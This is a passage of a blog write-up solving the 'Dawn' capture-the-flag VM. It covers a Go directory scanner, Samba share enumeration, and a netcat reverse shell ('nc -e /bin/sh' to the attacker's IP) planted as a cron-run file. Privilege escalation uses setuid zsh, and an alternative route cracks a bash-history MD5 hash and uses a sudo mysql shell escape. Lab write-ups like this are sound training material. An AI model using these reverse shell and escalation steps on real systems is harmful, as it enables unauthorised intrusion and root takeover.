</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (Ip1.intOctet[<span style=color:#ae81ff>3</span>]&lt;=Ip2.intOctet[<span style=color:#ae81ff>3</span>]){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Running the ping scanner helps me find the IP address of the VM. I
could then use that IP address with the port scanning script. The output is included below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>python port_scan<span style=color:#f92672>.</span>py  
</span></span><span style=display:flex><span>port <span style=color:#ae81ff>80</span> <span style=color:#f92672>is</span> open  
</span></span><span style=display:flex><span>port <span style=color:#ae81ff>139</span> <span style=color:#f92672>is</span> open  
</span></span><span style=display:flex><span>port <span style=color:#ae81ff>445</span> <span style=color:#f92672>is</span> open  
</span></span><span style=display:flex><span>port <span style=color:#ae81ff>3306</span> <span style=color:#f92672>is</span> open
</span></span></code></pre></div><p>I made some assumptions about what was running on the machine based on
the port number. Assuming everything is on default ports, then the
breakdown of services should be as follows:</p><table><thead><tr><th>port number</th><th>likely service</th></tr></thead><tbody><tr><td>80</td><td>web server</td></tr><tr><td>139/445</td><td>Samba</td></tr><tr><td>3306</td><td>sql database</td></tr></tbody></table><p>The first service I explore is the webserver on port 80. I visit it in my web browser. Opening the Ip address in the web browser reveals a
basic web page.</p><img src=https://spookyscary1.github.io/img/1dawn/construction.png alt="Under construction" class=center style=border-radius:8px><p>I wish to perform basic enumeration of directories within the website.
I check if the website has a robots.txt file. This file, if it exists,
tells search engine bots which parts of the website should and should
not be indexed. The website does not have a robots.txt file so I must
use other means to explore the website.</p><img src=https://spookyscary1.github.io/img/1dawn/robot.png alt="robots.txt not found" class=center style=border-radius:8px><p>This need leads to the creation of a new tool. I want a Web Content
Scanner. This tool would try to brute force directories on the webserver
using words in a wordlist. For example, the tool would try to visit
<a href=http://example.com/word1>http://example.com/word1</a> then
<a href=http://example.com/word2>http://example.com/word2</a> until all words in the wordlist are
exhausted. As output, the tool would report which URLs return
interesting HTTP response codes like 200, 302,301. I wrote the tool in
GO. The actual implementation is straightforward. See the code below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#a6e22e>main</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> (
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;flag&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;fmt&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;net/http&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;os&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;log&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;bufio&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;strings&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>func</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// variables declaration
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>host</span> <span style=color:#66d9ef>string</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>wordlist</span> <span style=color:#66d9ef>string</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// flags declaration using flag package
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>flag</span>.<span style=color:#a6e22e>StringVar</span>(<span style=color:#f92672>&amp;</span><span style=color:#a6e22e>host</span>, <span style=color:#e6db74>&#34;h&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#e6db74>&#34;Specify a host to scan.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>flag</span>.<span style=color:#a6e22e>StringVar</span>(<span style=color:#f92672>&amp;</span><span style=color:#a6e22e>wordlist</span>, <span style=color:#e6db74>&#34;w&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>, <span style=color:#e6db74>&#34;Specicify a wordlist to use&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// flag.Var(&amp;host, &#34;h&#34;, &#34;Specify a host to scan.&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>// flag.Var(&amp;wordlist, &#34;w&#34;, &#34;Specicify a wordlist to use&#34;)
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>flag</span>.<span style=color:#a6e22e>Parse</span>() <span style=color:#75715e>// after declaring flags we need to call it
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(!(<span style=color:#a6e22e>strings</span>.<span style=color:#a6e22e>HasSuffix</span>(<span style=color:#a6e22e>host</span>,<span style=color:#e6db74>&#34;/&#34;</span>))){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>host</span>=<span style=color:#a6e22e>host</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#34;/&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>file</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>os</span>.<span style=color:#a6e22e>Open</span>(<span style=color:#a6e22e>wordlist</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatal</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>defer</span> <span style=color:#a6e22e>file</span>.<span style=color:#a6e22e>Close</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>scanner</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>bufio</span>.<span style=color:#a6e22e>NewScanner</span>(<span style=color:#a6e22e>file</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> <span style=color:#a6e22e>scanner</span>.<span style=color:#a6e22e>Scan</span>(){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>resp</span>, <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>http</span>.<span style=color:#a6e22e>Get</span>(<span style=color:#a6e22e>host</span> <span style=color:#f92672>+</span><span style=color:#a6e22e>scanner</span>.<span style=color:#a6e22e>Text</span>())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span> <span style=color:#66d9ef>nil</span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatal</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>StatusCode</span><span style=color:#f92672>==</span><span style=color:#ae81ff>200</span> <span style=color:#f92672>||</span><span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>StatusCode</span> <span style=color:#f92672>==</span><span style=color:#ae81ff>301</span><span style=color:#f92672>||</span><span style=color:#a6e22e>resp</span>.<span style=color:#a6e22e>StatusCode</span><span style=color:#f92672>==</span><span style=color:#ae81ff>302</span>{
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>fmt</span>.<span style=color:#a6e22e>Println</span>(<span style=color:#a6e22e>host</span> <span style=color:#f92672>+</span><span style=color:#a6e22e>scanner</span>.<span style=color:#a6e22e>Text</span>())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// fmt.Println(host +scanner.Text())
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#a6e22e>err</span> <span style=color:#f92672>:=</span> <span style=color:#a6e22e>scanner</span>.<span style=color:#a6e22e>Err</span>(); <span style=color:#a6e22e>err</span> <span style=color:#f92672>!=</span><span style=color:#66d9ef>nil</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>log</span>.<span style=color:#a6e22e>Fatal</span>(<span style=color:#a6e22e>err</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Running the tool results in this output.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>    $ go run directory_scanner.go -h http://192.168.126.11/ -w common.txt
</span></span><span style=display:flex><span>    http://192.168.126.11/
</span></span><span style=display:flex><span>    http://192.168.126.11/index.html
</span></span><span style=display:flex><span>    http://192.168.126.11/logs
</span></span></code></pre></div><p>The logs directory looks interesting. I visit this URL in my web
browser, and the webpage displays several files. I download the only
file that is not empty.</p><img src=https://spookyscary1.github.io/img/1dawn/log.png alt="management log" class=center style=border-radius:8px><p>The file contains a large number of logs. The logs are a bit too dense
to read manually. I use the find tool in kwrite to look for evidence of
files being run. I discovered a log that indicates a file was being run
in the ITDEPT folder of a user named dawn. If we could upload a file
with the same name to the folder there is a chance it would be run.
Luckily earlier, we noted that ports associated with samba share were
open on the machine. A samba share seems like a viable means of
uploading files to the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>2020/08/12 09:50:01 <span style=color:#f92672>[</span>31;1mCMD: UID<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span> PID<span style=color:#f92672>=</span><span style=color:#ae81ff>1880</span>   | /bin/sh -c /home/dawn/ITDEPT/product-control <span style=color:#f92672>[</span>0m
</span></span></code></pre></div><p>I use smbclient to see which shares were open on the machine. The ITDEPT share looks like it is related to the folder we want access to.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>     ~ <span style=color:#f92672>[</span>SIGINT<span style=color:#f92672>]</span>&gt; smbclient -L //192.168.1.165/  
</span></span><span style=display:flex><span>    Can<span style=color:#960050;background-color:#1e0010>&#39;</span>t load /etc/samba/smb.conf - run testparm to debug it  
</span></span><span style=display:flex><span>    Password <span style=color:#66d9ef>for</span> <span style=color:#f92672>[</span>WORKGROUP<span style=color:#ae81ff>\s</span>pook2<span style=color:#f92672>]</span>:  
</span></span><span style=display:flex><span>      
</span></span><span style=display:flex><span>    Â Â Â Â Â Â Â Sharename Â Â Â Â Â Â Type Â Â Â Â Â Comment  
</span></span><span style=display:flex><span>    Â Â Â Â Â Â Â --------- Â Â Â Â Â Â ---- Â Â Â Â Â -------  
</span></span><span style=display:flex><span>    Â Â Â Â Â Â Â print$ Â Â Â Â Â Â Â Â Â Disk Â Â Â Â Â Printer Drivers  
</span></span><span style=display:flex><span>    Â Â Â Â Â Â Â ITDEPT Â Â Â Â Â Â Â Â Â Disk Â Â Â Â Â PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.  
</span></span><span style=display:flex><span>    Â Â Â Â Â Â Â IPC$ Â Â Â Â Â Â Â Â Â Â Â IPC Â Â Â Â Â Â IPC Service <span style=color:#f92672>(</span>Samba 4.9.5-Debian<span style=color:#f92672>)</span>  
</span></span><span style=display:flex><span>    SMB1 disabled -- no workgroup available
</span></span></code></pre></div><p>Connecting to the share allows me to upload a file to the folder. I
begin by creating a file with the following contents named after the
file I noted begin ran in the logs earilier.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -e /bin/sh 192.168.1.197 <span style=color:#ae81ff>80</span>
</span></span></code></pre></div><p>If this command is executed, it will create a reverse shell. A reverse
shell means the victim's computer will reach out to my computer and then
execute whatever commands I send it. I need to set up a listener on my
machine. The listener will be the process that waits for the victim to
connect. After the victim connects to the listener, I can run commands
on that machine. The program netcat will be used to create a listener on
my machine. The following command will do so:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nc -lvnp <span style=color:#ae81ff>80</span>
</span></span></code></pre></div><p>I am now ready to upload the file. I connect to the share.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>smbclient //192.168.1.165/ITDEPT
</span></span></code></pre></div><p>Then I upload the file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>    smb: <span style=color:#ae81ff>\&gt;</span> put product-control
</span></span></code></pre></div><h1 id=initial-compromise>Initial Compromise</h1><p>I got a response and now have a shell as the user dawn. The initial access has been gained. It is now time to escalate privileges. First, I spawn a tty shell using python.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
</span></span></code></pre></div><p>Now I can see what commands this user can run as root. Sudo -l gives
that information. The output is as follows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo -l  
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> dawn on dawn:  
</span></span><span style=display:flex><span>Â Â Â env_reset, mail_badpass,  
</span></span><span style=display:flex><span>Â Â Â secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin  
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>User dawn may run the following commands on dawn:  
</span></span><span style=display:flex><span>Â Â Â <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/mysql  
</span></span></code></pre></div><p>Dawn can run the MySQL command as root without entering the user's
password. A useful website called
<a href=https://gtfobins.github.io/>GTFObins</a> explains how to use these permissions to
gain a root shell. Unfortunately, I need the password of the root user
of the MySQL database. Luckily there is hope. The bash history file
contains a history of commands ran by the user and there is a chance the
password needed to login into MySQL is there. The relevant parts to the
history file are included below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;</span>$1$$<span style=color:#e6db74>bOKpT2ijO.XcGlpjgAup9/&#34;</span>  
</span></span><span style=display:flex><span>sudo -l    
</span></span><span style=display:flex><span>su    
</span></span><span style=display:flex><span>sudo -l    
</span></span><span style=display:flex><span>sudo mysql -u root -p   
</span></span></code></pre></div><p>The echoed command appears to contain the hashed password needed to log
into the MySQL database as root. This hash likely could be cracked.
Since there are multiple paths to root, and cracking the hack would take
time, I will elect to find an easier way to escalate privileges.</p><p>Another easy way to escalate privileges is to look for binaries that
have the setuid bit set. The setuid permission allows a user to run the binary as the user who owns the binary. This bit is often set to allow users to use specific binaries with elevated permissions. If the binary allows the user to spawn a shell with root permissions it can become problematic. The find command can be used to look for where binaries are
stored. The output is included below.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>find / -perm -u<span style=color:#f92672>=</span>s -type f 2&gt;/dev/null  
</span></span><span style=display:flex><span>/usr/sbin/mount.cifs  
</span></span><span style=display:flex><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
</span></span><span style=display:flex><span>/usr/lib/policykit-1/polkit-agent-helper-1  
</span></span><span style=display:flex><span>/usr/lib/eject/dmcrypt-get-device  
</span></span><span style=display:flex><span>/usr/lib/openssh/ssh-keysign  
</span></span><span style=display:flex><span>/usr/bin/su  
</span></span><span style=display:flex><span>/usr/bin/newgrp  
</span></span><span style=display:flex><span>/usr/bin/pkexec  
</span></span><span style=display:flex><span>/usr/bin/passwd  
</span></span><span style=display:flex><span>/usr/bin/sudo  
</span></span><span style=display:flex><span>/usr/bin/mount  
</span></span><span style=display:flex><span>/usr/bin/zsh  
</span></span><span style=display:flex><span>/usr/bin/gpasswd  
</span></span><span style=display:flex><span>/usr/bin/chsh  
</span></span><span style=display:flex><span>/usr/bin/umount  
</span></span><span style=display:flex><span>/usr/bin/chfn
</span></span></code></pre></div><p>/usr/bin/zsh is the most useful binary. Zsh is a shell program like bash or sh, as a result, using zsh to spawn a shell is rather trivial. I just run the command.</p><h1 id=privilege-escalation>privilege escalation</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ /usr/bin/zsh   
</span></span><span style=display:flex><span>/usr/bin/zsh Â   
</span></span><span style=display:flex><span>dawn# <span style=color:#75715e># Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   </span>
</span></span><span style=display:flex><span>whoami  
</span></span><span style=display:flex><span>root  
</span></span></code></pre></div><p>I now have root permissions and can read the root flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dawn# cat /root/flag.txt Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   
</span></span><span style=display:flex><span>cat /root/flag.txt  
</span></span><span style=display:flex><span>Hello! whitecr0wz here. I would like to congratulate and thank you <span style=color:#66d9ef>for</span> finishing the ctf, however, there is another way of getting a shell<span style=color:#f92672>(</span>very similar thou  
</span></span><span style=display:flex><span>gh<span style=color:#f92672>)</span>. Also, <span style=color:#ae81ff>4</span> other methods are available <span style=color:#66d9ef>for</span> rooting this box!  
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{[</span>redacted<span style=color:#f92672>]}</span>
</span></span></code></pre></div><h1 id=alternative-route-cracking-the-hash>Alternative route: cracking the hash</h1><p>I have enough time to investigate an alternative path to root. The
hashed value in the bash history of the user dawn could be cracked.
Hashing a password is normally a one-way process that should, in theory,
prevent the original value from being recovered. In practice, there are
ways of cracking hashes. The first step in this process is identifying
which hashing algorithm was used to create this hash.</p><p><a href=https://www.onlinehashcrack.com/hash-identification.php>Online
websites</a> can be used to identify the hash.
Alternatively, one could use the Linux
<a href=https://man7.org/linux/man-pages/man3/crypt.3.html>man-pages</a> for crypt. It states the hash is of the form <code>$_id_$_salt_$_encrypted_</code> where the id number represents the algorithm used. Looking at the table, we can identify our hash <code>$1$$bOKpT2ijO.XcGlpjgAup9/</code>.</p><table><thead><tr><th>ID</th><th>Method</th></tr></thead><tbody><tr><td>1</td><td>MD5</td></tr><tr><td>2a</td><td>Blowfish (not in mainline glibc; added in some Linux distributions)</td></tr><tr><td>5</td><td>SHA-256 (since glibc 2.7)</td></tr><tr><td>6</td><td>SHA-512 (since glibc 2.7)</td></tr></tbody></table><img src=https://spookyscary1.github.io/img/1dawn/pic.png alt="hash decrypt website" class=center style=border-radius:8px><p>Both methods lead to the same conclusion. The hash is an md5 hash.</p><p>It is now time to write a password cracker. I initially wanted to write the password cracker in Go, but I quickly changed my mind. Python seems easier to use. Primary the ability to re-create an existing hash by passing it into the crypt as a <a href=https://stackoverflow.com/questions/53416164/md5-hash-in-python>second
argument</a> seemed neat.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> crypt<span style=color:#f92672>.</span>crypt(<span style=color:#e6db74>&#39;alice&#39;</span>, <span style=color:#e6db74>&#39;$1$kDHTx$WKRXXT1P7UtjvU7CQ9eWs/&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>$</span>kDHTx<span style=color:#960050;background-color:#1e0010>$</span>WKRXXT1P7UtjvU7CQ9eWs<span style=color:#f92672>/</span>
</span></span></code></pre></div><p>It was time to learn how to get a python script that accepts command
line arguments. The <a href=https://docs.python.org/3/howto/argparse.html>argsparse</a> library seems to be the recommended
method of doing so. I stare at the documentation for about an hour and
struggle to make it work. I quickly learned I needed to escape the $
symbol in the hash when passing it as an argument. I then realized I
passed the wrong hash into the program as input. Once those two dumb
mistakes were fixed everything worked well. I used the rockyou.txt
wordlist to crack the hash.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python password_hash.py <span style=color:#ae81ff>\$</span>1<span style=color:#ae81ff>\$\$</span>bOKpT2ijO.XcGlpjgAup9/ ../assets/rockyouutf8.txt 
</span></span><span style=display:flex><span>cracked: <span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Time:  742.5095741019995
</span></span></code></pre></div><p>I also used <a href=https://github.com/Nuitka/Nuitka>Nuitka</a> to compile the program to see if it
ran any faster for fun.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./password_hash.dist/password_hash <span style=color:#ae81ff>\$</span>1<span style=color:#ae81ff>\$\$</span>bOKpT2ijO.XcGlpjgAup9/ ../assets/rockyouutf8.txt 
</span></span><span style=display:flex><span>cracked: <span style=color:#f92672>[</span>redacted<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Time:  742.5078724539999
</span></span></code></pre></div><p>The answer is no.</p><h2 id=privilege-escalation-1>privilege escalation</h2><p><a href=https://gtfobins.github.io/gtfobins/mysql/#sudo>GTFObins</a> is consulted once again.
<code>sudo mysql -e '\! /bin/sh'</code> is the command given to gain a root shell.
I add in the password cracked earlier.
<code>sudo mysql -e '\! /bin/sh'-p[redacted]</code>. The alternative path to root
has been performed. There are two more paths to root, I believe. I will
leave finding them as an exercise for the reader. This was a lot of fun.
I hope this write-up was interesting or informative.</p></div></article><hr><div class=post-info><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>2793 Words</p><p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>2022-05-15 00:00</p></div><hr><div class=sharing-buttons><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=Dawn%20writeup%20but%20with%20slightly%20more%20programming&caption=Dawn%20writeup%20but%20with%20slightly%20more%20programming&canonicalUrl=https%3a%2f%2fspookyscary1.github.io%2fposts%2f2022%2f05%2fdawn-writeup-but-with-slightly-more-programming%2f" target=_blank rel=noopener aria-label title="Share on tumblr"><div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 